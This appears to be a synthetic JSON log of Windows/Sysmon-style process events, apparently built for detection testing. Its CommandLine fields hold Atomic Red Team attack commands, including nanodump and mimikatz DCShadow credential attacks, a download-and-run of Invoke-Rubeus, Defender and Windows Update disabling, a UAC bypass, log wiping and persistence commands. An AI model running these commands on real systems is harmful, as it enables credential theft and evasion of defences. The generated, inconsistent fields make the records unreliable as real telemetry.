    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-37.lee.info",
        "User": "tlin",
        "ProcessID": 6177,
        "ProcessName": "malware.exe",
        "CommandLine": "\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\nanodump.x64.exe --silent-process-exit \\\"#{output_folder}\\\"\\n\",",
        "LogonID": 480229,
        "LogonGuid": "a1277b2e-e95f-4bc0-b7d3-839281681374",
        "SourceProcessID": 7256,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\face..exe",
        "DestinationProcessID": 4039,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\short..dll",
        "UtcTime": "2024-05-17T01:36:51.737309Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-05.madden.com",
        "User": "hguerrero",
        "ProcessID": 1574,
        "ProcessName": "nc.exe",
        "CommandLine": "\"wget --post-data=\\\"msg=AtomicTestT1048.002\\\" --timeout=5 --no-check-certificate https://example.com/ --delete-after\\n\",",
        "LogonID": 330259,
        "LogonGuid": "600298be-240f-4c34-b590-ccde16ea095f",
        "SourceProcessID": 1077,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\character..dll",
        "DestinationProcessID": 6874,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\high..exe",
        "UtcTime": "2024-05-17T01:36:51.737309Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-84.colon.info",
        "User": "riossara",
        "ProcessID": 5850,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"export AWS_REGION=#{aws_region} \\ncd #{stratus_path}\\necho \\\"starting warmup\\\"\\n./stratus warmup aws.defense-evasion.cloudtrail-event-selectors\\necho \\\"starting detonate\\\"\\n./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force\\n\",",
        "LogonID": 433492,
        "LogonGuid": "c3072635-d258-4187-b6ba-afe3f39c19e3",
        "SourceProcessID": 3929,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\window..exe",
        "DestinationProcessID": 1310,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\already..dll",
        "UtcTime": "2024-05-17T01:36:51.737309Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-78.everett.com",
        "User": "timothykoch",
        "ProcessID": 7726,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"# starting fake DC server, as SYSTEM (required)\\n$dc_output_file = \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\art-T1207-mimikatz-DC.log\\\"\\nRemove-Item $dc_output_file -ErrorAction Ignore\\n$mimikatzParam =\\\"`\\\"log $dc_output_file`\\\" `\\\"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`\\\" `\\\"exit`\\\"\\\"\\n$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \\\"/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzParam\\\"\\n\\n# wait for fake DC server to be ready...\\nStart-Sleep -Seconds 5\\n\\n# server ready, so trigger replication (push) and wait until it finished\\n& \\\"#{mimikatz_path}\\\" \\\"lsadump::dcshadow /push\\\" \\\"exit\\\"\\n\\nWrite-Host \\\"`nWaiting for fake DC server to return\\\"\\nWait-Process $dc\\n\\nWrite-Host \\\"`nOutput from fake DC server:\\\"\\nGet-Content $dc_output_file\\nStart-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it\\nRemove-Item $dc_output_file -ErrorAction Ignore\\n\\nWrite-Host \\\"End of DCShadow\\\"\\n\",",
        "LogonID": 184965,
        "LogonGuid": "11958b22-9f31-498b-8d2c-dcdb5939b1ca",
        "SourceProcessID": 4774,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\account..dll",
        "DestinationProcessID": 9150,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\decide..exe",
        "UtcTime": "2024-05-17T01:36:51.737309Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-60.graham.com",
        "User": "melindamills",
        "ProcessID": 7506,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"Invoke-WebRequest -OutFile C:\\\\Users\\\\$env:username\\\\Desktop\\\\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi\\n$file1 = \\\"C:\\\\Users\\\\\\\" + $env:username + \\\"\\\\Desktop\\\\LogMeInIgnition.msi\\\"\\nStart-Process -Wait $file1 /quiet;\\nStart-Process 'C:\\\\Program Files (x86)\\\\LogMeIn Ignition\\\\LMIIgnition.exe' \\\"/S\\\"\\n\",",
        "LogonID": 895078,
        "LogonGuid": "49cca170-f493-4844-8be7-c4fc096e6178",
        "SourceProcessID": 4112,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\thousand..exe",
        "DestinationProcessID": 6262,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\degree..dll",
        "UtcTime": "2024-05-17T01:36:51.737309Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-63.mitchell.com",
        "User": "mark89",
        "ProcessID": 3087,
        "ProcessName": "malware.exe",
        "CommandLine": "\"copy %SystemRoot%\\\\System32\\\\wscript.exe %APPDATA%\\\\svchost.exe /Y\\ncmd.exe /c %APPDATA%\\\\svchost.exe \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\T1036.003\\\\src\\\\T1036.003_masquerading.vbs\\\"\\n\",",
        "LogonID": 804668,
        "LogonGuid": "c7b5ef2e-49e4-4471-91dd-7ff1caa84865",
        "SourceProcessID": 9757,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\list..exe",
        "DestinationProcessID": 7083,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\pay..dll",
        "UtcTime": "2024-05-17T01:36:51.737309Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-32.ballard.com",
        "User": "heatherromero",
        "ProcessID": 8363,
        "ProcessName": "nc.exe",
        "CommandLine": "\"ip neighbour show\\n\",",
        "LogonID": 217338,
        "LogonGuid": "feb34193-486e-4292-a881-ba6ecc4e5cbb",
        "SourceProcessID": 9208,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\produce..dll",
        "DestinationProcessID": 9137,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\state..exe",
        "UtcTime": "2024-05-17T01:36:51.737309Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-12.schmidt.info",
        "User": "haleyfrench",
        "ProcessID": 4194,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"New-Item -Force -Path \\\"HKCU:\\\\Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\\\" -Value '#{command_to_execute}'\\nNew-ItemProperty -Force -Path \\\"HKCU:\\\\Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\\\" -Name \\\"DelegateExecute\\\"\\nStart-Process -FilePath $env:windir\\\\system32\\\\sdclt.exe\\nStart-Sleep -s 3\\n\",",
        "LogonID": 634775,
        "LogonGuid": "41929088-e1e5-47fa-a2d1-634f8a181bc1",
        "SourceProcessID": 5627,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\difference..exe",
        "DestinationProcessID": 5662,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\them..dll",
        "UtcTime": "2024-05-17T01:36:51.738814Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-46.wood.info",
        "User": "smurray",
        "ProcessID": 5059,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"New-ItemProperty \\\"HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\System\\\" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force\\nNew-ItemProperty \\\"HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\System\\\" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force\\nNew-ItemProperty \\\"HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\System\\\" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force\\nNew-ItemProperty \\\"HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\System\\\" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force\\nNew-ItemProperty \\\"HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\System\\\" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force\\nNew-ItemProperty \\\"HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\System\\\" -Name ShellSmartScreenLevel -Force\\n\",",
        "LogonID": 397921,
        "LogonGuid": "5f3312da-d727-4cc2-9781-d52b0e836a02",
        "SourceProcessID": 5615,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\huge..exe",
        "DestinationProcessID": 7693,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\during..dll",
        "UtcTime": "2024-05-17T01:36:51.738814Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-57.silva.info",
        "User": "victoria11",
        "ProcessID": 4995,
        "ProcessName": "nc.exe",
        "CommandLine": "\"reg query \\\"HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Internet Explorer\\\" /v svcVersion\\n\",",
        "LogonID": 869364,
        "LogonGuid": "681c8c05-f7bb-4e31-85e6-34a608a49246",
        "SourceProcessID": 6270,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\item..exe",
        "DestinationProcessID": 4217,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\a..exe",
        "UtcTime": "2024-05-17T01:36:51.738814Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-84.warner-white.net",
        "User": "elizabethmoreno",
        "ProcessID": 3759,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"#{regsvr32path}\\\\#{regsvr32name} /s /u /i:\\\"#{filename}\\\" scrobj.dll\\n\",",
        "LogonID": 628987,
        "LogonGuid": "c8e73882-10a8-4592-8a19-acf97eb33ccb",
        "SourceProcessID": 9192,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\mind..dll",
        "DestinationProcessID": 1049,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\city..exe",
        "UtcTime": "2024-05-17T01:36:51.738814Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-41.johnson-wilson.com",
        "User": "riddleallison",
        "ProcessID": 3532,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Start-Process \\\"#{exe_binary}\\\"\\nStart-Sleep -Seconds 7\\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force\",",
        "LogonID": 434008,
        "LogonGuid": "6cbdfa60-f011-4931-8353-1952fac1a982",
        "SourceProcessID": 8737,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\rock..exe",
        "DestinationProcessID": 5095,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\or..exe",
        "UtcTime": "2024-05-17T01:36:51.739819Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-68.harris.com",
        "User": "davidherrera",
        "ProcessID": 6383,
        "ProcessName": "nc.exe",
        "CommandLine": "\"tcpdump -c 5 -nnni #{interface}\\ntshark -c 5 -i #{interface}\\n\",",
        "LogonID": 196930,
        "LogonGuid": "c51f0e35-2d8e-4d2c-96e6-b10e53509a56",
        "SourceProcessID": 2018,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\continue..dll",
        "DestinationProcessID": 8445,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\author..dll",
        "UtcTime": "2024-05-17T01:36:51.739819Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-42.rios.biz",
        "User": "daviescharlene",
        "ProcessID": 5967,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname\\n\",",
        "LogonID": 658343,
        "LogonGuid": "7588ecaa-f9e6-4617-be93-0ee584c8322b",
        "SourceProcessID": 6546,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\at..dll",
        "DestinationProcessID": 3840,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\official..dll",
        "UtcTime": "2024-05-17T01:36:51.739819Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-00.graves.com",
        "User": "emilyfitzpatrick",
        "ProcessID": 5619,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\build\\\\namedpipes_executor.exe\\\" --pipe 1\\n\",",
        "LogonID": 900616,
        "LogonGuid": "58fce5ec-71c9-4cd0-a28d-580068120042",
        "SourceProcessID": 5684,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\close..dll",
        "DestinationProcessID": 9418,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\firm..exe",
        "UtcTime": "2024-05-17T01:36:51.739819Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-14.zimmerman.com",
        "User": "riveraalexander",
        "ProcessID": 1208,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"net user $ ATOMIC123! /add /active:yes\",",
        "LogonID": 969022,
        "LogonGuid": "f5d81691-f610-4666-ac31-688f91683f67",
        "SourceProcessID": 9607,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\discuss..exe",
        "DestinationProcessID": 4450,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\set..dll",
        "UtcTime": "2024-05-17T01:36:51.740820Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-94.luna.com",
        "User": "evansshawn",
        "ProcessID": 5675,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"for i in $(seq 1 5); do echo \\\"$i, Atomic Red Team was here!\\\"; sleep 1; done\\n\",",
        "LogonID": 171139,
        "LogonGuid": "771c746f-af8d-427f-bbf9-62124bf057f0",
        "SourceProcessID": 1730,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\international..dll",
        "DestinationProcessID": 1902,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\sense..dll",
        "UtcTime": "2024-05-17T01:36:51.740820Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-51.bryant.org",
        "User": "uhill",
        "ProcessID": 7142,
        "ProcessName": "nc.exe",
        "CommandLine": "\"$secure_pwd = \\\"#{password}\\\" | ConvertTo-SecureString -AsPlainText -Force\\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $secure_pwd\\nConnect-AzAccount -Credential $creds\\nNew-AzAutomationRunbook -Name #{runbook_name} -Type PowerShell -ResourceGroupName #{resource_group} -Description 'my-test-runbook' -AutomationAccountName #{automation_account_name}\\n\",",
        "LogonID": 593102,
        "LogonGuid": "043b1755-cf0e-4280-8335-dab4e6b80503",
        "SourceProcessID": 6292,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\standard..dll",
        "DestinationProcessID": 8980,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\behind..exe",
        "UtcTime": "2024-05-17T01:36:51.740820Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-56.mendoza-thornton.com",
        "User": "jeremyjohnson",
        "ProcessID": 9439,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"reg ADD \\\"HKCR\\\\CLSID\\\\{645FF040-5081-101B-9F08-00AA002F954E}\\\\shell\\\\open\\\\command\\\" /ve /d \\\"calc.exe\\\" /f\",",
        "LogonID": 518170,
        "LogonGuid": "4fd1ee41-ce24-46c9-a1a3-747a5a33afd8",
        "SourceProcessID": 7460,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\manager..dll",
        "DestinationProcessID": 1098,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\my..exe",
        "UtcTime": "2024-05-17T01:36:51.740820Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-12.austin-price.info",
        "User": "nicole38",
        "ProcessID": 8277,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"$PathToAtomicsFolder\\\\T1055.012\\\\bin\\\\x64\\\\CreateProcessWithPipe.exe -program \\\"#{hollow_binary_path}\\\" -debug\\n\",",
        "LogonID": 635442,
        "LogonGuid": "fec65b89-3f9b-4093-ac8f-75636844827c",
        "SourceProcessID": 7831,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\charge..exe",
        "DestinationProcessID": 1645,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\agency..dll",
        "UtcTime": "2024-05-17T01:36:51.740820Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-85.jones-nunez.com",
        "User": "mary68",
        "ProcessID": 3802,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"echo $0\\nif $(env |grep \\\"SHELL\\\" >/dev/null); then env |grep \\\"SHELL\\\"; fi\\nif $(printenv SHELL >/dev/null); then printenv SHELL; fi\\n\",",
        "LogonID": 828340,
        "LogonGuid": "c8f92d26-af91-4bc0-8d07-af4e28ff8400",
        "SourceProcessID": 6496,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\officer..dll",
        "DestinationProcessID": 1093,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\individual..dll",
        "UtcTime": "2024-05-17T01:36:51.741820Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-46.cox.org",
        "User": "arnoldjohn",
        "ProcessID": 9838,
        "ProcessName": "malware.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\AU\\\" /v \\\"NoAutoUpdate\\\" /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 349185,
        "LogonGuid": "c634dfa1-d173-4201-99b5-6e4b090b4f0c",
        "SourceProcessID": 9427,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\camera..dll",
        "DestinationProcessID": 6410,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\clear..exe",
        "UtcTime": "2024-05-17T01:36:51.741820Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-19.lozano.info",
        "User": "patriciacastro",
        "ProcessID": 1730,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"echo \\\"#{script_command}\\\" > #{script_path}\\nREG.exe ADD HKCU\\\\Environment /v UserInitMprLogonScript /t REG_SZ /d \\\"#{script_path}\\\" /f\\n\",",
        "LogonID": 396784,
        "LogonGuid": "d069fdbd-8881-4997-9099-4b77eefa3cbb",
        "SourceProcessID": 8988,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\school..dll",
        "DestinationProcessID": 2311,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\officer..exe",
        "UtcTime": "2024-05-17T01:36:51.741820Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-59.marshall.net",
        "User": "armstrongjason",
        "ProcessID": 8366,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"username=$(id -u -n) && lsof -u $username\\n\",",
        "LogonID": 381612,
        "LogonGuid": "899791d6-569c-4ec5-9da2-02cc3e2dcf06",
        "SourceProcessID": 8376,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\remember..dll",
        "DestinationProcessID": 8755,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\discussion..exe",
        "UtcTime": "2024-05-17T01:36:51.741820Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-95.smith.com",
        "User": "adamsstuart",
        "ProcessID": 4523,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"Disable-WindowsOptionalFeature -Online -FeatureName \\\"Windows-Defender-Gui\\\" -NoRestart -ErrorAction Ignore\\nDisable-WindowsOptionalFeature -Online -FeatureName \\\"Windows-Defender-Features\\\" -NoRestart -ErrorAction Ignore\\nDisable-WindowsOptionalFeature -Online -FeatureName \\\"Windows-Defender\\\" -NoRestart -ErrorAction Ignore\\nDisable-WindowsOptionalFeature -Online -FeatureName \\\"Windows-Defender-ApplicationGuard\\\" -NoRestart -ErrorAction Ignore\",",
        "LogonID": 202678,
        "LogonGuid": "daba0eb2-7f58-46d7-92ef-fe06a11cd605",
        "SourceProcessID": 5121,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\quite..dll",
        "DestinationProcessID": 1386,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\ago..dll",
        "UtcTime": "2024-05-17T01:36:51.741820Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-51.bennett.org",
        "User": "jessica81",
        "ProcessID": 8250,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"sudo log -f /var/log/system.log | : > /var/log/system.log\\n\",",
        "LogonID": 865329,
        "LogonGuid": "b17b5b2f-4655-4ce9-8910-649f1a8096b6",
        "SourceProcessID": 9161,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\interest..dll",
        "DestinationProcessID": 8590,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\difference..dll",
        "UtcTime": "2024-05-17T01:36:51.741820Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-68.jones.org",
        "User": "bensonandre",
        "ProcessID": 5153,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe /out:\\\"$env:localappdata\\\\Microsoft\\\\WindowsApps\\\\Get-Variable.exe\\\" \\\"PathToAtomicsFolder\\\\T1574.008\\\\bin\\\\calc.cs\\\"\\nPowershell -noprofile\\n\",",
        "LogonID": 696902,
        "LogonGuid": "3ffae68a-0ee0-4518-aed8-51d4c124a110",
        "SourceProcessID": 7863,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\public..exe",
        "DestinationProcessID": 7321,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\message..exe",
        "UtcTime": "2024-05-17T01:36:51.742819Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-40.roy.com",
        "User": "alyssajenkins",
        "ProcessID": 8310,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\\nInvoke-Rubeus -Command \\\"asreproast /format:hashcat /nowrap\\\"\",",
        "LogonID": 159205,
        "LogonGuid": "91db720b-3ada-462b-8963-dda36720ae34",
        "SourceProcessID": 5882,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\along..dll",
        "DestinationProcessID": 9703,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\green..exe",
        "UtcTime": "2024-05-17T01:36:51.742819Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-65.miranda.biz",
        "User": "russellamber",
        "ProcessID": 7083,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"$x = Get-Random -Minimum 2 -Maximum 99\\n$y = Get-Random -Minimum 2 -Maximum 99\\n$z = Get-Random -Minimum 2 -Maximum 99\\n$w = Get-Random -Minimum 2 -Maximum 99\\n\\nImport-Module ActiveDirectory\\n$account = \\\"#{account_prefix}-$x$y$z\\\"\\nNew-ADUser -Name $account -GivenName \\\"Test\\\" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False #{create_args}\\nAdd-ADGroupMember \\\"#{group}\\\" $account\\n\",",
        "LogonID": 589057,
        "LogonGuid": "29619488-b419-46ba-9841-9b106bb2fdd6",
        "SourceProcessID": 4669,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\mouth..exe",
        "DestinationProcessID": 4707,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\local..exe",
        "UtcTime": "2024-05-17T01:36:51.742819Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-44.rice.info",
        "User": "blairgwendolyn",
        "ProcessID": 3105,
        "ProcessName": "nc.exe",
        "CommandLine": "\"get-localgroup\\nGet-LocalGroupMember -Name \\\"Administrators\\\"\\n\",",
        "LogonID": 468368,
        "LogonGuid": "13b04345-36ee-46b9-8cd0-faf1125fc708",
        "SourceProcessID": 5048,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\himself..dll",
        "DestinationProcessID": 2668,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\both..exe",
        "UtcTime": "2024-05-17T01:36:51.742819Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-99.mason.info",
        "User": "qbecker",
        "ProcessID": 6608,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"& \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\AdFind.exe\\\" #{optional_args} -h #{domain} -s subtree -f \\\"objectclass=computer\\\" *\\n\",",
        "LogonID": 298901,
        "LogonGuid": "e52070d5-0539-4d30-b0f2-1c6245a494f3",
        "SourceProcessID": 3605,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\each..exe",
        "DestinationProcessID": 5361,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\resource..dll",
        "UtcTime": "2024-05-17T01:36:51.743820Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-73.collins-medina.com",
        "User": "amberhughes",
        "ProcessID": 4780,
        "ProcessName": "nc.exe",
        "CommandLine": "\"echo '#{command_to_add}' >> ~/.bash_profile\\n\",",
        "LogonID": 512878,
        "LogonGuid": "c6f18ed5-84d4-4f90-aa79-5f0f17714eb8",
        "SourceProcessID": 5565,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\leave..dll",
        "DestinationProcessID": 4197,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\maintain..exe",
        "UtcTime": "2024-05-17T01:36:51.743820Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-55.ferguson-williams.com",
        "User": "wperkins",
        "ProcessID": 9467,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"[ \\\"$(uname)\\\" = 'FreeBSD' ] && alias python3=python3.9\\nif [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi\\n\",",
        "LogonID": 358987,
        "LogonGuid": "7682339e-ea12-45dd-bc59-ae63b2748f81",
        "SourceProcessID": 7869,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\husband..exe",
        "DestinationProcessID": 4620,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\tend..dll",
        "UtcTime": "2024-05-17T01:36:51.743820Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-60.alvarado.com",
        "User": "kaylahudson",
        "ProcessID": 2063,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port}\\nnetworksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}\\n\",",
        "LogonID": 147762,
        "LogonGuid": "edf63bac-00c8-47cd-87ab-7fb7112fc540",
        "SourceProcessID": 1016,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\same..exe",
        "DestinationProcessID": 6247,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\green..exe",
        "UtcTime": "2024-05-17T01:36:51.744326Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-77.jones.com",
        "User": "cruzshannon",
        "ProcessID": 4887,
        "ProcessName": "backdoor.exe",
